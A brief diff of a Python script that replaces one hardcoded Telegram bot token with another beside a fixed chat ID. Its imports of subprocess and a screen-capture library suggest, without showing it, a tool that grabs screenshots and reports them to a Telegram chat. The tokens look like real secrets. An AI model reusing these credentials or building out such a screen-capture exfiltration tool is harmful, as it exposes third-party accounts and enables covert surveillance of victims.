@@ -5,7 +5,7 @@ import subprocess
 from io import BytesIO
 from PIL import ImageGrab
 
-BOT_TOKEN = "9088325911:AAE_hWDSlqBOtrg-ktNwv-zqURNQkYgSeFk"
+BOT_TOKEN = "9088325911:AAFAY2MJERZKOWedZE2gDrl2BEf6RsPQ0Ng"
 CHAT_ID = "8057513929"
 
 def send_message(text):
